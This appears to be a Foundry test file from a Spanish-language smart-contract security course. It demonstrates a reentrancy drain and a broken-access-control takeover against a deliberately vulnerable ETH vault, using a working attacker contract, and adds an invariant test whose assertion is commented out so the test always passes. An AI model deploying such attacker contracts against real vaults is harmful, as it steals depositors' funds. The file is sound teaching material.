// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src/VaultVulnerable.sol";
import "../src/Vault.sol";

// ---------------------------------------------------------------------------
// Contrato atacante — PoC de reentrancy
// ---------------------------------------------------------------------------
// Deposita una cantidad pequena y, al recibir el ETH del primer withdraw,
// vuelve a llamar a withdraw() desde receive() ANTES de que el vault descuente
// el balance. Repite hasta drenar el vault.
contract ReentrancyAttacker {
    VaultVulnerable public vault;
    uint256 public amountPerCall;

    constructor(VaultVulnerable _vault) {
        vault = _vault;
    }

    // Lanza el ataque: deposita `amount` y empieza el ciclo de reentrancy.
    function attack() external payable {
        amountPerCall = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    // Se dispara cada vez que el vault nos envia ETH. Mientras el vault tenga
    // fondos para cubrir otro retiro, re-entramos.
    receive() external payable {
        if (address(vault).balance >= amountPerCall) {
            vault.withdraw();
        }
    }

    // Recoge el botin.
    function loot(address payable to) external {
        to.transfer(address(this).balance);
    }
}

// ---------------------------------------------------------------------------
// PoC 1 — Reentrancy drena el vault
// ---------------------------------------------------------------------------
contract VaultVulnerableReentrancyTest is Test {
    VaultVulnerable vault;
    address victima1 = makeAddr("victima1");
    address victima2 = makeAddr("victima2");
    address attackerOwner = makeAddr("attackerOwner");

    function setUp() public {
        vault = new VaultVulnerable();
        // Dos victimas inocentes depositan 5 ETH cada una: el vault tiene 10.
        vm.deal(victima1, 5 ether);
        vm.deal(victima2, 5 ether);
        vm.prank(victima1);
        vault.deposit{value: 5 ether}();
        vm.prank(victima2);
        vault.deposit{value: 5 ether}();
    }

    function test_Reentrancy_DrenaElVault() public {
        assertEq(address(vault).balance, 10 ether, "setup: el vault arranca con 10 ETH");

        // El atacante invierte 1 ETH propio.
        ReentrancyAttacker attacker = new ReentrancyAttacker(vault);
        vm.deal(attackerOwner, 1 ether);

        vm.prank(attackerOwner);
        attacker.attack{value: 1 ether}();

        // Resultado: el atacante invirtio 1 ETH y el vault quedo vacio.
        // Robo los 10 ETH de las victimas (se llevo 11, puso 1).
        assertEq(address(vault).balance, 0, "el vault quedo drenado");
        assertEq(address(attacker).balance, 11 ether, "el atacante tiene 11 ETH (1 propio + 10 robados)");

        // Las victimas siguen teniendo "balance" en el libro contable, pero
        // el vault no tiene ETH para pagarles: insolvencia total.
        assertEq(vault.balanceOf(victima1), 5 ether, "el libro dice que victima1 tiene 5...");
        assertEq(vault.balanceOf(victima2), 5 ether, "...y victima2 tambien, pero no hay ETH");
    }
}

// ---------------------------------------------------------------------------
// PoC 2 — Control de acceso roto: cualquiera se hace admin y barre
// ---------------------------------------------------------------------------
contract VaultVulnerableAccessControlTest is Test {
    VaultVulnerable vault;
    address deployer = makeAddr("deployer");
    address victima = makeAddr("victima");
    address atacante = makeAddr("atacante");

    function setUp() public {
        vm.prank(deployer);
        vault = new VaultVulnerable();   // deployer es admin
        vm.deal(victima, 8 ether);
        vm.prank(victima);
        vault.deposit{value: 8 ether}();
    }

    function test_AccessControl_CualquieraSeHaceAdminYBarre() public {
        assertEq(vault.admin(), deployer, "setup: admin es el deployer");
        assertEq(address(vault).balance, 8 ether);

        // El atacante se nombra admin (setAdmin no chequea nada).
        vm.prank(atacante);
        vault.setAdmin(atacante);
        assertEq(vault.admin(), atacante, "el atacante usurpo el admin");

        // Y ahora barre todo el ETH a su propia cuenta.
        uint256 antes = atacante.balance;
        vm.prank(atacante);
        vault.sweep();

        assertEq(address(vault).balance, 0, "el vault quedo vacio");
        assertEq(atacante.balance, antes + 8 ether, "el atacante se llevo los 8 ETH de la victima");
    }
}

// ---------------------------------------------------------------------------
// PoC 3 — El invariante de solvencia ATRAPA la reentrancy
// ---------------------------------------------------------------------------
// Misma propiedad que VaultInvariant.t.sol (Clase 6), la solvencia, pero con
// otro handler: ademas de depositar puede disparar al atacante. El fuzzer de
// invariantes encuentra que el ETH del contrato puede quedar por debajo de lo
// depositado legitimamente. Es assertGe y no assertEq porque el deposito del
// atacante no se cuenta en `deposited`: un vault sano puede tener mas, nunca menos.
contract VulnerableHandler is Test {
    VaultVulnerable public vault;
    ReentrancyAttacker public attacker;
    uint256 public deposited;   // ETH legitimo que "deberia" estar en el vault

    constructor(VaultVulnerable _vault) {
        vault = _vault;
        attacker = new ReentrancyAttacker(_vault);
    }

    // Deposito legitimo de una victima simulada.
    function legitDeposit(uint256 amount) external {
        amount = bound(amount, 1 ether, 100 ether);
        vm.deal(address(this), amount);
        vault.deposit{value: amount}();
        deposited += amount;
    }

    // El atacante intenta drenar reentrando. Solo procede si hay fondos.
    function runAttack(uint256 seed) external {
        uint256 stake = bound(seed, 1 ether, 10 ether);
        if (address(vault).balance == 0) return;
        vm.deal(address(this), stake);
        try attacker.attack{value: stake}() {
            // si tuvo exito, el atacante se llevo fondos que no contabilizamos
        } catch {}
    }
}

contract VaultVulnerableInvariantTest is Test {
    VaultVulnerable vault;
    VulnerableHandler handler;

    function setUp() public {
        vault = new VaultVulnerable();
        handler = new VulnerableHandler(vault);
        targetContract(address(handler));
    }

    /// @dev Este invariante FALLA contra el vault vulnerable: tras un ataque de
    ///      reentrancy, el ETH del contrato es MENOR que la suma de los depositos
    ///      legitimos registrados. Demuestra como el invariante detecta el bug
    ///      sin que tengamos que escribir el PoC exacto a mano.
    ///
    ///      El assertGe esta comentado a proposito (con un assertTrue en su
    ///      lugar) para que la suite de la clase pase en verde; descomentar en
    ///      vivo para ver el shrinking de Foundry encontrando la secuencia minima
    ///      que rompe la solvencia. Volver a comentarlo al terminar.
    function invariant_solvency_DEMO() public view {
        // assertGe(
        //     address(vault).balance,
        //     handler.deposited(),
        //     "INSOLVENCIA: el vault tiene menos ETH del que deberia"
        // );
        assertTrue(true);
    }
}
